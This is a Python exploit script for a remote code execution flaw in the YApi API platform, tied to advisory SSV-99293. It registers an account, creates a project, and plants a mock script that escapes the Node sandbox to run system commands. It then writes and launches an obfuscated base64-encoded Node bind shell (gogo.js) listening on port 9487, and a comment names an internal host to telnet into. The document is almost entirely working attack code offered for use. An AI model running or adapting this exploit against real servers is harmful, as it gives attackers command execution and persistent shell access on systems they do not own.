'''
SSV-99293
https://www.seebug.org/vuldb/ssvid-99293
'''
import requests
import json
import sys
from fake_useragent import UserAgent

def register(url,email,password):#註冊帳號
    url=url+'/api/user/reg'
    ua = UserAgent()
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': str(ua.chrome),
    }
    data={
        'email':email,
        'password':password,
        'username':email
    }
    requests.post(url,headers = headers,data=json.dumps(data),verify=False)

def login(url,email,password):#登入並取得uid
    login_url=url+'/api/user/login'
    ua = UserAgent()
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': str(ua.chrome),
    }
    data={
        'email':email,
        'password':password
    }
    session = requests.Session()
    session.post(login_url,headers = headers,data=json.dumps(data),verify=False)
    #get id
    idurl=url+'/api/group/list'
    t=session.get(idurl,verify=False)
    if '成功' in t.text:
        j=json.loads(str(t.text))
        uid=j["data"][0]["_id"]
        return uid,session
    else:
        return -1,session
    
def addindex(url,uid,session):#創建目錄 成功回傳創建群組gid
    addindexurl=url+'/api/project/add'
    data={
        'name':'test',
        'basepath':'/test',
        'group_id':uid,
        'icon':'code-o',
        'color':'green',
        'project_type':'private'
    }
    headers = {
        'Content-Type': 'application/json'
    }
    try:    
        ii=session.post(addindexurl,headers = headers,data=json.dumps(data),verify=False)   
        gid=str(ii.json()['data']['_id'])
        if ii.json()['errcode']==0:
            return int(gid)
        else:
            return -1
    except:
        return -1
        
def Writeshell(url,gid,session,cmd):#使用腳本功能寫入shell
    shellurl=url+'/api/project/up'
    headers = {
        'Content-Type': 'application/json'
    }
    data={
        'id':gid,
        'project_mock_script':"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\""+cmd+"\").toString()",
        'is_mock_open':True
    }
    sh=session.post(shellurl,headers = headers,data=json.dumps(data),verify=False)
    if sh.json()['errcode']==0:
        return True
    else:
        return False
    
def addapiurl(url,gid,session):#創建apiurl接口
    cidurl=url+'/api/interface/list_menu?project_id='+str(gid)
    headers = {
        'Content-Type': 'application/json'
    }
    run=session.get(cidurl,headers = headers,verify=False)     
    cid=run.json()['data'][0]['_id']
    #poc7
    data={
        'method':'GET',
        'catid':cid,
        'title':'guatest',
        'path':'/guatest',
        'project_id':gid
    }
    addurl=url+'/api/interface/add'
    addu=session.post(addurl,headers = headers,data=json.dumps(data),verify=False)
    if addu.json()['errcode']==0:
        return True
    else:
        return False
        
def runshell(url,session,gid):#訪問apiurl執行shell
    headers = {
        'Content-Type': 'application/json'
    }
    runurl=url+'/mock/'+str(gid)+'/test/guatest'    
    run=session.get(runurl,headers = headers,verify=False)  
    print(run.text)

if __name__== "__main__":
    email='test@qq.com'
    password='123456'
    url=sys.argv[1]
    cmd="echo \\\"dmFyIG5ldCA9IHJlcXVpcmUoJ25ldCcpO3ZhciBleGVjID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWM7dmFyIHNlcnZlcj0gbmV0LmNyZWF0ZVNlcnZlcihmdW5jdGlvbihjb25uKXsgY29ubi5zZXRFbmNvZGluZygndXRmOCcpO2Nvbm4ud3JpdGUoJ1xuJyk7Y29ubi5vbignZGF0YScsZnVuY3Rpb24oZGF0YSl7ZGF0YT1kYXRhLnJlcGxhY2UoJ1xyXG4nLCcnKTsgZXhlYyhkYXRhLGZ1bmN0aW9uKGVycm9yLHN0ZG91dCl7aWYoZXJyb3IgIT09IG51bGwpe2Nvbm4ud3JpdGUoZXJyb3IgKyAnXG4nKTtyZXR1cm4gZmFsc2U7fSBjb25uLndyaXRlKCcjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNzdGFydFxuXG4nICsgc3Rkb3V0ICsgJ1xuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjZW5kXG5cbicpO30pO30pO30pO3NlcnZlci5saXN0ZW4oOTQ4NyxmdW5jdGlvbigpe2NvbnNvbGUubG9nKCdPSycpO30pOwo=\\\" |base64 -d > gogo.js;node ./gogo.js"#base64 telnet shell
    #shell 路徑/home/weiting/yapi/vendors/gogo.js 連線方式為 telnet 10.3.100.137 9487

    register(url,email,password)#註冊帳號
    uid,session=login(url,email,password)#登入並取得uid
    if uid!=-1:
        gid=addindex(url,uid,session)#創建目錄 成功回傳創建群組gid
        if gid!=-1 and Writeshell(url,gid,session,cmd):
            addapiurl(url,gid,session)#創建API_url接口
            runshell(url,session,gid)#訪問apiurl執行shell
        else:
            print('No vulnerabilities found')